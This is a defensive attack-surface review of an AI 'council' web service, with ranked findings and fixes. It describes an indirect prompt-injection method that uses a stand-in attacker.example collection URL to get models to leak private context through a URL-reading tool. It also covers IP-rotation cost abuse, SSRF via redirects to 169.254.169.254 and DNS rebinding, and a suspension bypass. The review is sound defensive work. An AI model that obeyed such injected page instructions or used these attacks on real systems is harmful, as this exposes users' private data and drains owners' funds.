# ALOP-AI attack-surface review — Sol

**Date:** 2026-08-12  
**Scope:** `alop-ai.com`, its production backend, and this repository on `main`  
**Method:** source and Git-history review plus read-only production requests. No fuzzing, credential attacks, load, or exploit payloads were sent.

Focused URL-guard, link-check, rate-limit-key, and tenant-scope tests passed 57/57. Those tests validate their current contracts; notably, the link test proves the guard runs before fetch, not that the vetted address is used or that redirect hops are rechecked.

## Executive conclusion

The most valuable attack is not shell access. It is getting one council member to turn private prompt context into an outbound URL. The tool set is otherwise read-only, capped, and has no code-execution or write primitive, so an injected page cannot directly alter Supabase, run commands, or take over another tenant. It can still buy an attacker confidentiality loss, an answer the user did not ask for, and extra paid calls.

The most immediately exploitable source flaw is economic: the blanket and paid-route cost limiters are mounted before Clerk, so their code path intended to key on authenticated user ID never runs. There is no per-user spend ceiling behind them. A valid user who changes source IP receives a fresh expensive-call allowance.

I found no current cross-tenant query or unauthenticated application route. The public surface is 30 Express routes: `/health` and the Stripe webhook are unauthenticated by design; the other 28 use `requireAuth`, with ownership/admin/terminal checks added where needed.

## Findings, ranked by attacker gain

### 1. High — indirect prompt injection can exfiltrate private context through `read_url` (design verified; model compliance unverified)

**Where:** `backend/lib/council-tools.js:25-26,134-150`; `backend/lib/agent-loop.js:310-345`; `backend/lib/tool-registry.js:134-156`; `backend/server.js:1648-1677,404-430`.

**Attack:** (1) The attacker publishes a page that search can return. (2) Its text tells a model to encode conversation details, remembered facts, or file-derived text into `https://attacker.example/collect?d=...` and call `read_url`. (3) The victim asks a question that causes ALOP-AI to search/read that page. (4) The preamble asks the models to ignore page instructions, but it is only a natural-language control. (5) If any one of seven seats complies, its request joins the union of tool calls and is executed. Jina or Firecrawl then requests the attacker URL, exposing the path/query in the attacker's access log.

**Gain:** private prompt context can leave ALOP-AI; the attacker can also induce tool calls the user never requested and increase provider spend. One compromised seat is enough. I did not run this against production or the production roster, so exploit reliability is unverified.

**What it cannot currently buy:** the tools cannot write data or execute code. External text also cannot directly poison `user_facts`: fact extraction is intentionally limited to the user's own message (`backend/lib/user-facts.js:15-35`).

**Small fix:** stop accepting model-authored arbitrary URLs. Give each search result a server-minted opaque ID and let `read_url` accept only that ID, resolving to the exact stored URL. Do not allow the model to add a path, query, or host after it has consumed untrusted content. Add a seven-seat adversarial evaluation using a canary secret and assert that no outbound request contains it.

### 2. High — expensive endpoints are rate-limited by IP, not user, and have no spend ceiling (source verified)

**Where:** `backend/server.js:1204-1229,1315-1359`; `backend/lib/rate-limit-key.js:32-39`; council cost and tool caps at `backend/lib/agent-loop.js:65-73`.

**Attack:** (1) Create or use one valid account. (2) Send council requests through changing public IPs. (3) Each IP receives a fresh 30-council-requests/minute bucket. The generic and route-specific limiters both execute before `clerkMiddleware`, so `req.auth` is absent and `rateLimitKey` always falls back to IP. (4) Each accepted request can invoke multiple council models and up to 12 tool calls; the approved fallback may add another council round.

**Gain:** the attacker converts a cheap account plus proxy addresses into the owner's model/search bill. Changing `User-Agent` no longer works, and IPv6 `/56` normalization is good, but neither stops source-IP rotation. I found usage reads for administrators, not an admission-time per-user token, request, or currency budget.

**Small fix:** keep the pre-auth IP limiter as an outer floor, then place a second limiter after `requireAuth` on every paid route so it keys on `u:<Clerk userId>`. Back it with the existing shared Postgres store. Before the first provider call, atomically reserve against a per-user daily/monthly budget and refund unused reservation after completion. This also makes the owner's deliberate extra fallback whip a bounded product choice rather than an unbounded cost multiplier.

### 3. Medium — link validation checks one DNS answer, then fetches by name and follows unchecked redirects (source verified; exploitation unverified)

**Where:** `backend/lib/url-guard.js:134-178`; `backend/lib/link-check.js:128-150`; `backend/server.js:580-609`.

**Attack A, redirect:** return a search result on an attacker-controlled public host that responds `302 Location: http://169.254.169.254/...` or another private address. `assertSafeUrl` approves the original public host, then `fetchPageHead` uses `redirect: 'follow'` without rechecking `Location`.

**Attack B, DNS rebinding:** make the safety lookup return a public address and the fetch's second lookup return a private address. `assertSafeUrl` returns a vetted `{address,family}`, but `checkLinks` discards it and calls `fetchPage(url)` by hostname.

**Gain:** a blind GET from the backend to private/link-local services, with an availability/classification side channel. It could trigger an internal state-changing GET. The checker reads only up to 16 KB of HTML head and does not return the body to the attacker, so I did not prove metadata disclosure and do not rank this as direct infrastructure compromise. No production exploit was attempted.

**Small fix:** replace direct `fetch` with one guarded fetch helper. Connect to the vetted address while preserving the original Host header and HTTPS SNI; use manual redirects; resolve and validate every `Location` hop; cap hops. Pass the safe object through `checkLinks` instead of the raw URL. Keep the existing address parser: local checks confirmed that decimal, octal, hexadecimal IPv4 and IPv4-mapped IPv6 normalize to blocked addresses.

### 4. Medium — suspension does not stop the paid feedback model call (source verified)

**Where:** `backend/server.js:2466-2487` compared with paid routes at `1516`, `2224`, `2416`, and `2449`.

**Attack:** after an abusive account is suspended, keep its still-valid Clerk session and POST valid `up`/`down` feedback from rotating IPs. `/api/feedback` has `requireAuth` but not `checkSuspended`, and each request invokes `FAST_MODEL` before saving the note.

**Gain:** suspension fails as the owner's kill switch for this paid path. Combined with finding 2, the account can continue generating model spend.

**Small fix:** add `checkSuspended` immediately after `requireAuth` on `/api/feedback`, with a route test proving a suspended user receives 403 and `callModel` is not reached.

## Tenancy and auth result: no bypass found in current source

The Supabase client uses `SUPABASE_SERVICE_ROLE_KEY` (`backend/server.js:1262`), so RLS does not protect backend queries. The real boundary is the server-resolved user ID. I reviewed `chats`, `chat_files`, `user_facts`, `feedback_notes`, audit/admin access, and the semantic RPC. Current user routes derive identity from Clerk and carry owner predicates; `match_user_facts` passes `p_user_id: userId` (`backend/server.js:1009-1017`) and the test has a separate RPC contract (`backend/lib/tenant-scope.test.js:162-174`). Admin reads require `requireAdmin`; the console additionally requires the terminal allowlist/secret and audits attempts.

Route enumeration found no missing `requireAuth`. `/health` is intentionally public. The Stripe webhook is intentionally before Clerk and requires Stripe signature verification (`backend/server.js:1143`). Live, unauthenticated `/api/chats` returned 401; an allowed-origin preflight succeeded and an attacker-origin preflight returned 403.

I did not certify live RLS state. The repository and handoff record the `SECURITY DEFINER` recursion repair and explicit grants, but this review had no Supabase production connection. Because service-role traffic bypasses RLS, a source review or service-role test cannot prove the live policies work for `authenticated`.

## Secrets and error responses

I scanned current tracked files and every Git revision for common production secret shapes without printing values. The only token-shaped hit was a deliberate admin-command test fixture; `.env.example` exposes names/placeholders, not server credentials. I found no repository-history evidence for the Perplexity value mentioned in the handoff; whether that separately disclosed key was rotated remains an operational check for the owner/provider dashboard.

There are no stack traces in the API responses I inspected. Several authenticated handlers return raw `err.message` (`backend/server.js:2163,2376,2384,2487,2593-2635,2659-2806`), including model/provider and Supabase failures. In this public-source application I could not name additional attacker gain beyond error fingerprinting, so I am not inflating it into a finding. A small hardening diff would return stable public error codes and keep the original only in Sentry/server logs.

One secret-hygiene concern remains: Google API credentials are placed in query strings for provider calls. That is not a public-repo leak by itself, but query credentials are easier to retain in outbound tracing/proxy logs than authorization headers. Prefer a supported header and verify Sentry/log redaction before calling it closed.

## What is genuinely well defended

The URL parser rejects credentials, all resolved addresses, IPv4/IPv6 private and reserved ranges, link-local metadata space, and non-HTTP schemes. Its parsing handles unusual IP encodings; the flaw is that callers do not preserve its vetted result.

The tool loop has meaningful blast-radius controls: read-only tools, no shell/database-write primitive, 4 rounds, 12 unique calls, per-call/tool/wall clocks, output clamps, and untrusted text kept out of system position. Those controls turn many injections into answer manipulation rather than server compromise. Opaque file IDs and `(user, chat)` binding are particularly strong.

Clerk `authorizedParties` is derived from exact allowed origins, `requireAuth` uses the supported `getAuth(req)` path, suspension caching uses generation-safe invalidation, and cross-tenant writes use server identity rather than body identity. The admin console's independent admin, terminal-allowlist, secret, rate-limit, and audit layers are proportionate.

## Unexamined or unverified

- No authenticated browser session was available, so I did not read responses from signed-in routes or validate Clerk session revocation behavior end to end.
- No production Supabase connection was available, so live tables, policies, grants, views, RPC definitions, and service-role grants were not queried.
- No `OLLAMA_HOST` or provider dashboards/logs were available. I did not test the seven production models against injection, confirm live seat health, inspect spend, or verify the leaked-key rotation. [At the time of this review, the gateway is now OpenRouter.]
- `COUNCIL_TOOLS` and optional-provider state can only be established from the Render boot banner; it was not available here.
- Read-only production checks showed the frontend healthy and Clerk loading without console errors. The backend was still serving the pre-fix SAMEORIGIN/`unsafe-inline` headers at the observation time; I excluded those already-fixed issues as directed. This is deployment lag to verify, not a new source finding.
- Dependency advisories were not refreshed from third-party registries because this review stayed inside the named host/repository boundary.

This was an authorized, bounded defensive review. It is not a guarantee that no other vulnerability exists; untested areas above must not be read as passing.
